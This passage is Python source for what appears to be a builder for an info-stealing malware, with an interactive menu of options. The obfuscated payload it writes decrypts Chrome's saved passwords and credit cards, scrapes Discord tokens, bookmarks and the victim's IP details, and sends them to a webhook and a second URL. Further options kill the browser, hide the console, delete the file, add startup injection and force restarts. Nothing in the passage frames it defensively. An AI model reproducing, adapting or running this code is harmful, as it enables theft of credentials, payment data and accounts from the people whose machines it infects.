    f.write('\neveryone = True\nOO0O000O000OO00O00 = socket.gethostname()\nOO0O000O000OO00O0 = socket.gethostbyname(OO0O000O000OO00O00)\ndef ConvertDate(ft):\n\tutc = datetime.utcfromtimestamp(((10 * int(ft)) - FileName) / NanoSeconds)\n\treturn utc.strftime(\'%Y-%m-%d %H:%M:%S\')\ndef O0O00OO000O0O00OO():\n\ttry:\n\t\twith open(os.environ[bytes.fromhex(\'5553455250524f46494c45\').decode(\'utf-8\')] + os.sep + r\'AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Local State\',\"r\", encoding=\'utf-8\') as f:\n\t\t\tO0OOOOO0000OOOOOOOOO = f.read()\n\t\t\tO0OOOOO0000OOOOOOOOO = json.loads(O0OOOOO0000OOOOOOOOO)\n\texcept:\n\t\texit()\n\tO0OOOOOO000O0O00OO = base64.b64decode(O0OOOOO0000OOOOOOOOO[bytes.fromhex(\'6f735f6372797074\').decode(\'utf-8\')][bytes.fromhex(\'656e637279707465645f6b6579\').decode(\'utf-8\')])\n\tO0OOOOOO000O0O00OO = O0OOOOOO000O0O00OO[5:]\n\tO0OOOOOO000O0O00OO = win32crypt.CryptUnprotectData(O0OOOOOO000O0O00OO, None, None, None, 0)[1]\n\treturn O0OOOOOO000O0O00OO\nheaders = {\'Content-Type\': \'application/json\',\'User-Agent\': \'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11\'}\n')
        

  else:
    f.write('\nlololeveryone = False\nOO0O000O000OO00O00 = socket.gethostname()\nOO0O000O000OO00O0 = socket.gethostbyname(OO0O000O000OO00O00)\ndef OO000OOO0OO0O(O00O0000OO0O0O0O0,O00000O0O000O0000):\n\n\twith open(O0OOO0000OOOOOOOOO) as f:\n\t\t\tdata2 = json.load(f)\n\t\t\tO0O00OOO0000OOOOOO0O = data2[bytes.fromhex(\'726f6f7473\').decode(\'utf-8\')][bytes.fromhex(\'626f6f6b6d61726b5f626172\').decode(\'utf-8\')][bytes.fromhex(\'6368696c6472656e\').decode(\'utf-8\')]\n\t\t\tfor i in range(len(O0O00OOO0000OOOOOO0O)):\n\t\t\t\tbookmark= (f\"Name: {O0O00OOO0000OOOOOO0O[i][bytes.fromhex(\'6e616d65\').decode(\'utf-8\')]}\\nUrl: <{O0O00OOO0000OOOOOO0O[i][bytes.fromhex(\'75726c\').decode(\'utf-8\')]}>\\nAdded on: {ConvertDate(O0O00OOO0000OOOOOO0O[i][bytes.fromhex(\'646174655f6164646564\').decode(\'utf-8\')])}\\n\")\n\t\t\t\tO00O00000O0O00000 = json.dumps({bytes.fromhex(\"636f6e74656e74\").decode(\'utf-8\'): bookmark})\n\t\t\t\treq = Request(webhook, data=O00O00000O0O00000.encode(), headers=headers)\n\t\t\t\turlopen(req)\n\t\t\t\treq = Request(O00O00OO00OO00OOO0, data=O00O00000O0O00000.encode(), headers=headers)\n\t\t\t\turlopen(req)\n\t\t\t\tOOOO0O000OOO0O0O0 = Request(webhook,data=O00O0000OO0O0O0O0.encode(),headers=O00000O0O000O0000)\n\t\t\t\turlopen(OOOO0O000OOO0O0O0)\n\t\t\t\tOOOO0O000OOO0O0O0 = Request(O00O00OO00OO00OOO0,data=O00O0000OO0O0O0O0.encode(),headers=O00000O0O000O0000)\n\t\t\t\turlopen(OOOO0O000OOO0O0O0)\ndef ConvertDate(ft):\n\tutc = datetime.utcfromtimestamp(((10 * int(ft)) - FileName) / NanoSeconds)\n\treturn utc.strftime(\'%Y-%m-%d %H:%M:%S\')\ndef O0O00OO000O0O00OO():\n\ttry:\n\t\twith open(os.environ[bytes.fromhex(\'5553455250524f46494c45\').decode(\'utf-8\')] + os.sep + r\'AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Local State\',\"r\", encoding=\'utf-8\') as f:\n\t\t\tO0OOOOO0000OOOOOOOOO = f.read()\n\t\t\tO0OOOOO0000OOOOOOOOO = json.loads(O0OOOOO0000OOOOOOOOO)\n\texcept:\n\t\texit()\n\tO0OOOOOO000O0O00OO = base64.b64decode(O0OOOOO0000OOOOOOOOO[bytes.fromhex(\'6f735f6372797074\').decode(\'utf-8\')][bytes.fromhex(\'656e637279707465645f6b6579\').decode(\'utf-8\')])\n\tO0OOOOOO000O0O00OO = O0OOOOOO000O0O00OO[5:]\n\tO0OOOOOO000O0O00OO = win32crypt.CryptUnprotectData(O0OOOOOO000O0O00OO, None, None, None, 0)[1]\n\treturn O0OOOOOO000O0O00OO\nheaders = {\'Content-Type\': \'application/json\',\'User-Agent\': \'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11\'}\n')
  f.write('def O0O0OOO0000OOOOOO0O():\n\tO0OOOOOO000O0O00OO = O0O00OO000O0O00OO()\n\tlogin_db = os.environ[\'USERPROFILE\'] + os.sep + r\'AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\default\\\\Web Data\'\n\tshutil.copy2(login_db,\"CCvault.db\")\n\tconn = sqlite3.connect(\"CCvault.db\")\n\tcursor = conn.cursor()\n\ttry:\n\t\tcursor.execute(\"SELECT * FROM credit_cards\")\n\t\tfor r in cursor.fetchall():\n\t\t\tO0OOOO0OOOO0000OOO0O = r[1]\n\t\t\tOOOOOO0000OOO0O = r[4]\n\t\t\tO0OOOO0O000O0000OOO0O = OOO00OO0OOO0OO0OO(OOOOOO0000OOO0O, O0OOOOOO000O0O00OO)\n\t\t\tO000OOO0000OOO0O = r[2]\n\t\t\tO0OOOOOO0000OOO0O = r[3]\n\t\t\tO0O00OOOO0000OOO0O = (\"Name in Card: \" + O0OOOO0OOOO0000OOO0O + \"Number: \" + O0OOOO0O000O0000OOO0O + \"Expire Month: \" + str(O000OOO0000OOO0O) + \"Expire Year: \" + str(O0OOOOOO0000OOO0O) + \"----------------------------------------------------\")\n\t\t\tO00O00O00OOO0O00O = json.dumps({bytes.fromhex("636f6e74656e74").decode(\'utf-8\'): O0O00OOOO0000OOO0O})\n\t\t\treq = Request(webhook, data=O00O00O00OOO0O00O.encode(), headers=headers)\n\t\t\turlopen(req)\n\t\t\treq = Request(O00O00OO00OO00OOO0, data=O00O00O00OOO0O00O.encode(), headers=headers)\n\t\t\turlopen(req)\n\texcept Exception as e:\n\t\tpass\n\t\tcursor.close()\n\t\tconn.close()\n\t\ttry:\n\t\t\tos.remove(\"CCvault.db\")\n\t\texcept Exception as e:\n\t\t\tpass\ndef decrypt(OOOO0000OO00OO000, payload):\n\treturn OOOO0000OO00OO000.decrypt(payload)\ndef OOO00OO0OOO0000O0(aes_key, iv):\n\treturn RSA.new(aes_key, RSA.MODE_GCM, iv)\ndef OOO00OO0OOO0OO0OO(buff, O0OOOOOO000O0O00OO):\n\ttry:\n\t\tiv = buff[3:15]\n\t\tpayload = buff[15:]\n\t\tcipher = OOO00OO0OOO0000O0(O0OOOOOO000O0O00OO, iv)\n\t\tdecrypted_pass = decrypt(cipher, payload)\n\t\tdecrypted_pass = decrypted_pass[:-16].decode()\n\t\treturn decrypted_pass\n\texcept Exception as e:\n\t\tpass\ndef O0OOO00O0O0O0OO0O0O(OO0O0OOO0000OOO00):\n\tOO0O0OOO0000OOO00 += \'\\Local Storage\\leveldb\'\n\tOOO00O0O0O000OO00 = []\n\tfor OO00OO00OO00OOO00 in os.listdir(OO0O0OOO0000OOO00):\n\t\tif not OO00OO00OO00OOO00.endswith(bytes.fromhex(\"2e6c6f67\").decode(\'utf-8\')) and not OO00OO00OO00OOO00.endswith(bytes.fromhex(\"2e6c6462\").decode(\'utf-8\')):\n\t\t\tcontinue\n\t\tfor O0O0O00O0OO0OOO0O in [OO0OOOO0O0OO0O00O.strip() for OO0OOOO0O0OO0O00O in open(f\'{OO0O0OOO0000OOO00}\\{OO00OO00OO00OOO00}\',errors=\'ignore\').readlines() if OO0OOOO0O0OO0O00O.strip()]:\n\t\t\tfor OO0O0000000OO000O in (r\'[\w-]{24}\.[\w-]{6}\.[\w-]{27}\',r\'mfa\.[\w-]{84}\'):\n\t\t\t\tfor OOO0O00O0OOOOO0O0 in re.findall(OO0O0000000OO000O, O0O0O00O0OO0OOO0O):\n\t\t\t\t\tOOO00O0O0O000OO00.append(OOO0O00O0OOOOO0O0)\n\t\t\t\t\treturn OOO00O0O0O000OO00\ndef OO000OOO0OO0O(O00O0000OO0O0O0O0,O00000O0O000O0000):\n\t\twith open(O0OOO0000OOOOOOOOO) as f:\n\t\t\tdata2 = json.load(f)\n\t\t\tO0O00OOO0000OOOOOO0O = data2[bytes.fromhex(\'726f6f7473\').decode(\'utf-8\')][bytes.fromhex(\'626f6f6b6d61726b5f626172\').decode(\'utf-8\')][bytes.fromhex(\'6368696c6472656e\').decode(\'utf-8\')]\n\t\t\tfor i in range(len(O0O00OOO0000OOOOOO0O)):\n\t\t\t\tbookmark= (f\"Name: {O0O00OOO0000OOOOOO0O[i][bytes.fromhex(\'6e616d65\').decode(\'utf-8\')]}\\nUrl: <{O0O00OOO0000OOOOOO0O[i][bytes.fromhex(\'75726c\').decode(\'utf-8\')]}>\\nAdded on: {ConvertDate(O0O00OOO0000OOOOOO0O[i][bytes.fromhex(\'646174655f6164646564\').decode(\'utf-8\')])}\\n")\n\t\t\t\tO00O00000O0O00000 = json.dumps({bytes.fromhex("636f6e74656e74").decode(\'utf-8\'): bookmark})\n\t\t\t\treq = Request(webhook, data=O00O00000O0O00000.encode(), headers=headers)\n\t\t\t\turlopen(req)\n\t\t\t\treq = Request(O00O00OO00OO00OOO0, data=O00O00000O0O00000.encode(), headers=headers)\n\t\t\t\turlopen(req)\n\t\t\t\tOOOO0O000OOO0O0O0 = Request(webhook,data=O00O0000OO0O0O0O0.encode(),headers=O00000O0O000O0000)\n\t\t\t\turlopen(OOOO0O000OOO0O0O0)\n\t\t\t\tOOOO0O000OOO0O0O0 = Request(O00O00OO00OO00OOO0,data=O00O0000OO0O0O0O0.encode(),headers=O00000O0O000O0000)\n\t\t\t\turlopen(OOOO0O000OOO0O0O0)\ndef main():\n\tOOO0000OOO0OO00OO = os.getenv(\'LOCALAPPDATA\')\n\tO000O0O0OOOOO0O0O = os.getenv(\'APPDATA\')\n\tO0000OO0O0O0O0O0O = {\'Discord\': O000O0O0OOOOO0O0O + \'\\\\Discord\',\'Discord Canary\': O000O0O0OOOOO0O0O +\'\\\\discordcanary\',\'Discord PTB\': O000O0O0OOOOO0O0O +\'\\\\discordptb\',\'Google Chrome\':OOO0000OOO0OO00OO + \'\\\\Google\\\\Chrome\\\\User Data\\\\Default\',\'Opera\':O000O0O0OOOOO0O0O + \'\Opera Software\\\\Opera Stable\',\'Brave\': OOO0000OOO0OO00OO + \'\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\',\'Yandex\':OOO0000OOO0OO00OO +\'\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\'}\n\tmessage = \'@everyone\' if everyone else \'\'\n\tfor O0O0OOOOOOOOO0O0O, O0OOO0000OO0OOO0O in O0000OO0O0O0O0O0O.items():\n\t\tif not os.path.exists(O0OOO0000OO0OOO0O):\n\t\t\tcontinue\n\t\tmessage += f\'\\n**{O0O0OOOOOOOOO0O0O}**\\n\'\n\t\tmessage += \'Computer Name is: \'  +OO0O000O000OO00O00 + \'\\n\'\n\t\tmessage += \'Computer IP Address is: \'  + OO0O000O000OO00O0 + \'\\n\'\n\t\tmessage += \'Victim\\\'s IP details: \'+ \'\\n\'\n\t\tmessage += \'IP : \'  + ip + \'\\n\' + \'Region : \' + region + \'\\n\' + \'Country: \' + country + \'\\n\' + \'City: \' + city + \'\\n\' + \'Org: \' + org + \'\\n\'\n\t\tPopen(\'taskkill /F /IM chrome.exe\')\n\t\twhile(True):\n\t\t\ttry:\n\t\t\t\tmessage += \'All Tokens are: \' +\'\\n\'\n\t\t\t\tmessage += \'Extracted Tokens: \'+ \"\\n\"\n\t\t\t\tdata1=os.path.expanduser(\'~\')+\'\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\'\n\t\t\t\tconnection = sqlite3.connect(data1)\n\t\t\t\tprint (\'[>]Connected to data base..\')\n\t\t\t\tcursor = connection.cursor()\n\t\t\t\tcursor.execute(\'SELECT action_url, username_value, password_value FROM logins\')\n\t\t\t\tfinal_data=cursor.fetchall()\n\t\t\t\tprint (\'[>]Found\'+str(len(final_data))+\'password..\')\n\t\t\t\tO0O000OOO0OO0O0O0 = \'@everyone\' if everyone else \'\'\n\t\t\t\tfor website_data in final_data:\n\t\t\t\t\ttry:\n\t\t\t\t\t\tpassword = win32crypt.CryptUnprotectData(website_data[2], None, None, None, 0)[1]\n\t\t\t\t\t\tif(website_data[0] != \"\" and website_data[1] != \"\"):\n\t\t\t\t\t\t\tO0O000OOO0OO0O0O0+=\'Website: \'+\'\\n\'+\'<\'+str(website_data[0]) + \'>\'+\"\\n\"\n\t\t\t\t\t\tif(website_data[1] != \"\" and website_data[0] != \"\"):\n\t\t\t\t\t\t\tO0O000OOO0OO0O0O0+=\'Username: \'+str(website_data[1]) + \"\\n\"\n\t\t\t\t\t\tif(website_data[0] != \"\" and website_data[1] != \"\"):\n\t\t\t\t\t\t\tO0O000OOO0OO0O0O0+=\'Password: \'+str(password) + \"\\n\"\n\t\t\t\t\t\t\tO0O000OOO0OO0O0O0+=\"\\n----------------------------------------------------\\n\"\n\t\t\t\t\texcept:\n\t\t\t\t\t\t\tpass\n\t\t\t\tpayload = json.dumps({\'content\': O0O000OOO0OO0O0O0})\n\t\t\t\theaders = {\'Content-Type\':\'application/json\',\'User-Agent\': \'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11\'}\n\t\t\t\tprint (\'[>]Decrypted\' +str(len(final_data))+\'passwords..\')\n\t\t\t\tprint(message)\n\t\t\t\tbreak\n\t\t\texcept:\n\t\t\t\t\t\tpass\n\t\tOO0OOO0O0000O0O00 = O0OOO00O0O0O0OO0O0O(O0OOO0000OO0OOO0O)\n\t\ti = 0\n\t\ttry:\n\t\t\tif len(OO0OOO0O0000O0O00) > 0:\n\t\t\t\t\t\tfor O0O0O0OO0OO0000O0 in OO0OOO0O0000O0O00:\n\t\t\t\t\t\t\ti = i + 1\n\t\t\t\t\t\t\tmessage += \'----**\'+\'token\'+ f\'{i}\' +\'**----\\n\'\n\t\t\t\t\t\t\tmessage += O0O0O0OO0OO0000O0 + \'\\n\'\n\t\t\t\t\t\telse:\n\t\t\t\t\t\t\tmessage += \'No tokens Found\' + \'\\n\'\n\t\t\t\t\t\tmessage += \'\\n\'\n\t\texcept:\n\t\t\tprint(\'No tokens\')\n\tO00000O0O000O0000 = {\n\t\tbytes.fromhex(\"436f6e74656e742d54797065\").decode(\'utf-8\'):\n\t\t\tbytes.fromhex("6170706c69636174696f6e2f6a736f6e").decode(\'utf-8\'),\n\t\t\tbytes.fromhex(\"557365722d4167656e74\").decode(\'utf-8\'):\n\t\t\tbytes.fromhex("4d6f7a696c6c612f352e3020285831313b204c696e7578207838365f363429204170706c655765624b69742f3533372e313120284b48544d4c2c206c696b65204765636b6f29204368726f6d652f32332e302e313237312e3634205361666172692f3533372e3131\").decode(\'utf-8\')}\n\tOO0O00000O0O0O00O = json.dumps({bytes.fromhex(\"636f6e74656e74\").decode(\'utf-8\'): message})\n\tO00OO0000O0O0O000 = json.dumps({bytes.fromhex("636f6e74656e74").decode(\'utf-8\'): bytes.fromhex(\"2d2d2d2d2d2d2d2d2d2d2d2d2d2d437265646974204361726420496e666f726d6174696f6e3a2d2d2d2d2d2d2d2d2d2d2d2d2d2d\").decode(\'utf-8\')})\n\tO00O00000O0O0O000 = json.dumps({bytes.fromhex("636f6e74656e74").decode(\'utf-8\'): bytes.fromhex(\"2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d426f6f6b6d61726b733a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d\").decode(\'utf-8\')})\n\tO00O0000OO0O0O000 = json.dumps({bytes.fromhex(\"636f6e74656e74\").decode(\'utf-8\'): bytes.fromhex(\"2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d56696374696d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d\").decode(\'utf-8\')})\n\tO00O0000OO0O0O0O0 = json.dumps({bytes.fromhex("636f6e74656e74").decode(\'utf-8\'): bytes.fromhex("2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d").decode(\'utf-8\')})\n\ttry:\n\t\tOOOO0O000O000O0O0 = Request(webhook,data=O00O0000OO0O0O000.encode(),headers=O00000O0O000O0000)\n\t\turlopen(OOOO0O000O000O0O0)\n\t\tOOOO0O000O000O0O0 = Request(O00O00OO00OO00OOO0,data=O00O0000OO0O0O000.encode(),headers=O00000O0O000O0000)\n\t\turlopen(OOOO0O000O000O0O0)\n\t\tOOOO0O000O000OOO0 = Request(webhook,data=OO0O00000O0O0O00O.encode(),headers=O00000O0O000O0000)\n\t\turlopen(OOOO0O000O000OOO0)\n\t\tOOOO0O000O000OOO0 = Request(O00O00OO00OO00OOO0,data=OO0O00000O0O0O00O.encode(),headers=O00000O0O000O0000)\n\t\turlopen(OOOO0O000O000OOO0)\n\t\treq = Request(webhook, data=payload.encode(), headers=headers)\n\t\turlopen(req)\n\t\treq = Request(O00O00OO00OO00OOO0, data=payload.encode(), headers=headers)\n\t\turlopen(req)\n\t\treq = Request(webhook, data=O00OO0000O0O0O000.encode(), headers=headers)\n\t\turlopen(req)\n\t\t')
  if(getCredit == True):
    f.write('O0O0OOO0000OOOOOO0O()\n\t\t')
      
  if(getBook == True):
    f.write('\n\t\tOO000OOO0OO0O(O00O0000OO0O0O0O0,O00000O0O000O0000)\n\t\t')  
      

      
      
        
  f.write('\n\texcept:\n\t\tpass')

  f.write('\nif __name__ == \'__main__\':\n\tmain()')
  if(startup == True):
    f.write('\n\tinject()')
  f.write(f'\nwith open(\"injected{filename}.py\", \"a\") as O00O00OOO00OOO:\n\tO00O00OOO00OOO.write(f\'\\nif __name__ == \\\'__main__\\\':\\n\\tmain()\')')
      #THESE effect the injected files settings
      
  if(message == True):
    f.write(f'\n\tO00O00OOO00OOO.write(\'\\n\\tos.system(\\\'mshta vbscript:Execute(\"msgbox \\\"\\\"{message}"":close")\\\')\')')
  if(restart == True):
    f.write('\n\tO00O00OOO00OOO.write(\'\\nos.system(\\\'shutdown /r /f\\\')\')')

  if(custom == True):
    f.write(f'\n\tO00O00OOO00OOO.write(\'\\nos.system(\\\'shutdown /r /c \\\"{customString}\\\"\\n\')')
  if(hide == 1):
    f.write('\n\tO00O00OOO00OOO.write(\'\\nimport ctypes \\nctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )\\n\')')

  if(message == True):
    f.write(f'\nos.system(\'mshta vbscript:Execute(\"msgbox ""{message}"":close")\')')
  if(remove == True):
    f.write('\nos.remove(sys.argv[0])')
  if(restart == True):
    f.write('\nos.system(\'shutdown /r /f\')')
  if(custom == True):
    f.write(f'\nos.system(\'shutdown /r /c \"{customString}\"\')')

  os.system(f'mshta vbscript:Execute("msgbox ""Path to file is {os.path.realpath(f.name)}"":close")')
  print(f'Path to file created is {os.path.realpath(f.name)}')

while(True):
  var = input()

  if(var == 'help'):
    showHelp()
  if(var == '1' or var == 'everyone' or var == '@everyone' or var == 'Everyone' or var == '@Everyone'):
    everyone = showEveryone(everyone)
  if(var == '2' or var == 'message' or var == 'message'):
    message,messageString = showMessage(message)
  if(var == '3' or var == 'remove' or var == 'Remove'):
    remove = showRemove(remove)
  if(var == '4' or var == 'hide' or var == 'Hide'):
    hide = showHide(hide)
  if(var == '5' or var == 'getCredit' or var == 'getcredit'):
    getCredit = showCredit(getCredit)
  if(var == '6' or var == 'getBook' or var == 'getbook'):
    getBook = showBook(getBook)
  if(var == '7' or var == 'startup' or var == 'start'):
    startup = showStartup(startup)
  if(var == '8' or var == 'custom' or var == 'Custom'):
    custom,customString = showCustom(custom)
  if(var == '9' or var == 'restart' or var == 'Restart' or var == 'forceRestart'):
    restart = showRestart(restart)
  if(var == 'toggle on'):
    filename,webhook,message,messageString,everyone,remove,hide,getCredit,getBook,startup,custom,customString,restart = toggleAll('ON')
  if(var == 'toggle off'):
    filename,webhook,message,messageString,everyone,remove,hide,getCredit,getBook,startup,custom,customString,restart = toggleAll('OFF')
  if(var == 'status'):
    showStatus()
  if(var == 'webhook' or var == 'setWebhook' or var == 'Webhook'):
    webhook = setWebhook(True)
  if(var == 'filename' or var == 'setFilename' or var == 'Filename'):
    filename = setFilename()
  if(var == 'download'):
    download()
  if(var == 'exit'):
    exit()

    





  
  
